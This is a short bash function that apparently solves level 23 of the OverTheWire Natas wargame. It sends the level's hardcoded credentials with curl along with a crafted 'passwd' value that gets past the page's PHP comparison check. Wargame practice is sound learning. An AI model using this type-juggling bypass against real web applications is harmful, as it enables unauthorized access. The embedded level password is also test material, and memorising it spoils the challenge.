natas23_(){
	user_pass="natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"
	url="http://natas23.natas.labs.overthewire.org"

	val=$(curl -isu $user_pass $url?passwd=11iloveyou)

	echo "$val"
}
